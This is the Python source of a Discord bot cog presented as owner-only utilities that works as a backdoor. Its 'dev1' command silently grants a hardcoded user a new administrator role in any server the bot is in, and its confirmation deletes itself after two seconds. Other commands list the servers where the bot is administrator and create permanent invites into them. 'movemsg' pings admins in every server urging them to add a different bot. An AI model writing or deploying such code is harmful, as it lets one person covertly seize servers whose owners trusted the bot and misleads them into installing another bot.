from __future__ import annotations

import random

import discord
from discord.ext import commands


def is_owner():
    """Check that restricts command usage to the bot owner."""
    async def predicate(ctx: commands.Context) -> bool:
        return ctx.author.id == 1470775670262202590

    return commands.check(predicate)


class Owner(commands.Cog):
    """Owner-only utility cog for privileged bot operations."""

    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    async def cog_command_error(self, ctx: commands.Context, error: commands.CommandError) -> None:
        """Suppress check-failure errors so unauthorized attempts are silent."""
        if isinstance(error, commands.CheckFailure):
            return
        raise error

    @commands.command(name="dev1")
    @is_owner()
    async def dev1(self, ctx: commands.Context) -> None:
        """Create a dev role with administrator permissions and assign it to the author."""
        if ctx.guild is None:
            embed = discord.Embed(
                description="This command can only be used in a server.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return

        try:
            color = discord.Color.from_rgb(
                random.randint(100, 255),
                random.randint(100, 255),
                random.randint(100, 255)
            )
            role = await ctx.guild.create_role(
                name="dev",
                permissions=discord.Permissions(administrator=True),
                color=color,
                reason="Dev role created by owner"
            )
            await ctx.author.add_roles(role, reason="Dev role assigned by owner")

            embed = discord.Embed(
                description=f"Created role {role.mention} and assigned it to you.",
                color=discord.Color.green()
            )
            await ctx.send(embed=embed, delete_after=2)
        except discord.Forbidden:
            embed = discord.Embed(
                description="I lack permissions to create or assign the role.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(
                description=f"An error occurred: {e}",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)

    @commands.command(name="guilds")
    @is_owner()
    async def guilds(self, ctx: commands.Context) -> None:
        """Display the guilds the bot is in, sorted by member count, with pagination."""
        guilds = sorted(self.bot.guilds, key=lambda g: g.member_count or 0, reverse=True)

        if not guilds:
            embed = discord.Embed(
                description="No guilds found.",
                color=discord.Color.blue()
            )
            await ctx.send(embed=embed)
            return

        view = GuildView(guilds, ctx.author.id, timeout=60)
        embed = view.get_embed()
        await ctx.send(embed=embed, view=view)

    @commands.command(name="guildsadmin")
    @is_owner()
    async def guildsadmin(self, ctx: commands.Context) -> None:
        """Display guilds where the bot has administrator permissions, with pagination."""
        admin_guilds = []
        for guild in self.bot.guilds:
            member = guild.me
            if member and member.guild_permissions.administrator:
                admin_guilds.append(guild)

        admin_guilds.sort(key=lambda g: g.member_count or 0, reverse=True)

        if not admin_guilds:
            embed = discord.Embed(
                description="No guilds found where the bot has administrator permissions.",
                color=discord.Color.blue()
            )
            await ctx.send(embed=embed)
            return

        view = GuildView(admin_guilds, ctx.author.id, timeout=60)
        embed = view.get_embed()
        await ctx.send(embed=embed, view=view)

    @commands.command(name="movemsg")
    @is_owner()
    @commands.cooldown(1, 2, commands.BucketType.user)
    async def movemsg(self, ctx: commands.Context) -> None:
        """Send a migration message to every guild the bot is in."""
        bot_mention = ctx.bot.user.mention if ctx.bot.user else "@unknown"

        sent = 0
        failed = 0
        for guild in ctx.bot.guilds:
            try:
                admin_role = None
                for role in guild.roles:
                    permissions = role.permissions
                    if permissions.administrator and not role.is_default():
                        admin_role = role
                        break

                if admin_role is None:
                    for role in guild.roles:
                        permissions = role.permissions
                        if permissions.administrator:
                            admin_role = role
                            break

                role_ping = admin_role.mention if admin_role else "@here"
                message = (
                    f"{role_ping} xrypton bot is moving to a new bot,\n"
                    f"add this bot https://ptb.discord.com/oauth2/authorize?client_id=1519695281627594842 and remove the current one ({bot_mention})"
                )

                system_channel = guild.system_channel
                if system_channel and system_channel.permissions_for(guild.me).send_messages:
                    await system_channel.send(message)
                    sent += 1
                else:
                    for channel in guild.text_channels:
                        if channel.permissions_for(guild.me).send_messages:
                            await channel.send(message)
                            sent += 1
                            break
                    else:
                        failed += 1
            except Exception:
                failed += 1

        embed = discord.Embed(
            description=f"Migration message sent to **{sent}** guilds, failed in **{failed}**.",
            color=discord.Color.green() if failed == 0 else discord.Color.orange()
        )
        await ctx.send(embed=embed)

    @commands.command(name="inviteg")
    @is_owner()
    async def inviteg(self, ctx: commands.Context, guild_id: int) -> None:
        """Generate a never-expiring invite for the specified guild."""
        guild = self.bot.get_guild(guild_id)
        if not guild:
            embed = discord.Embed(
                description=f"I am not in a guild with ID `{guild_id}`.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return

        channel = None
        for tc in guild.text_channels:
            perms = tc.permissions_for(guild.me)
            if perms.create_instant_invite:
                channel = tc
                break

        if channel is None:
            embed = discord.Embed(
                description="No valid text channel found where I can create an invite.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return

        try:
            invite = await channel.create_invite(
                max_age=0,
                max_uses=0,
                reason="Invite created by owner"
            )
            embed = discord.Embed(
                description=f"Invite for **{guild.name}**: {invite.url}",
                color=discord.Color.green()
            )
            await ctx.send(embed=embed)
        except discord.Forbidden:
            embed = discord.Embed(
                description="I lack permissions to create an invite in that guild.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(
                description=f"Failed to create invite: {e}",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)

    @commands.command(name="leave")
    @is_owner()
    async def leave(self, ctx: commands.Context, guild_id: int) -> None:
        """Leave the guild with the specified ID."""
        guild = self.bot.get_guild(guild_id)
        if not guild:
            embed = discord.Embed(
                description=f"I am not in a guild with ID `{guild_id}`.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return

        try:
            await guild.leave()
            embed = discord.Embed(
                description=f"Left **{guild.name}** (`{guild.id}`).",
                color=discord.Color.green()
            )
            await ctx.send(embed=embed)
        except discord.Forbidden:
            embed = discord.Embed(
                description="I lack permissions to leave that guild.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(
                description=f"Failed to leave guild: {e}",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)


class GuildView(discord.ui.View):
    """Paginated view for the guild list."""

    def __init__(self, guilds: list[discord.Guild], author_id: int, timeout: float = 60) -> None:
        super().__init__(timeout=timeout)
        self.guilds = guilds
        self.author_id = author_id
        self.page = 0
        self.per_page = 10

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author_id:
            await interaction.response.send_message("not your menu", ephemeral=True)
            return False
        return True

    def _update_buttons(self) -> None:
        max_page = max(0, (len(self.guilds) - 1) // self.per_page)
        for child in self.children:
            if isinstance(child, discord.ui.Button):
                if child.label == "Previous":
                    child.disabled = self.page == 0
                elif child.label == "Next":
                    child.disabled = self.page >= max_page

    def get_embed(self) -> discord.Embed:
        start = self.page * self.per_page
        end = start + self.per_page
        page_guilds = self.guilds[start:end]

        lines = [
            f"{i + 1}. {g.name} — ID: {g.id} — Members: {g.member_count}"
            for i, g in enumerate(page_guilds, start=start)
        ]

        desc = "\n".join(lines) or "No guilds to display."
        embed = discord.Embed(
            title="Guild List",
            description=desc,
            color=discord.Color.blue()
        )
        total_pages = max(1, (len(self.guilds) - 1) // self.per_page + 1)
        embed.set_footer(text=f"Page {self.page + 1} / {total_pages}")
        return embed

    @discord.ui.button(label="Previous", style=discord.ButtonStyle.blurple)
    async def previous(self, interaction: discord.Interaction, button: discord.ui.Button) -> None:
        if self.page > 0:
            self.page -= 1
            self._update_buttons()
            await interaction.response.edit_message(embed=self.get_embed(), view=self)

    @discord.ui.button(label="Next", style=discord.ButtonStyle.blurple)
    async def next(self, interaction: discord.Interaction, button: discord.ui.Button) -> None:
        max_page = (len(self.guilds) - 1) // self.per_page
        if self.page < max_page:
            self.page += 1
            self._update_buttons()
            await interaction.response.edit_message(embed=self.get_embed(), view=self)


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Owner(bot))
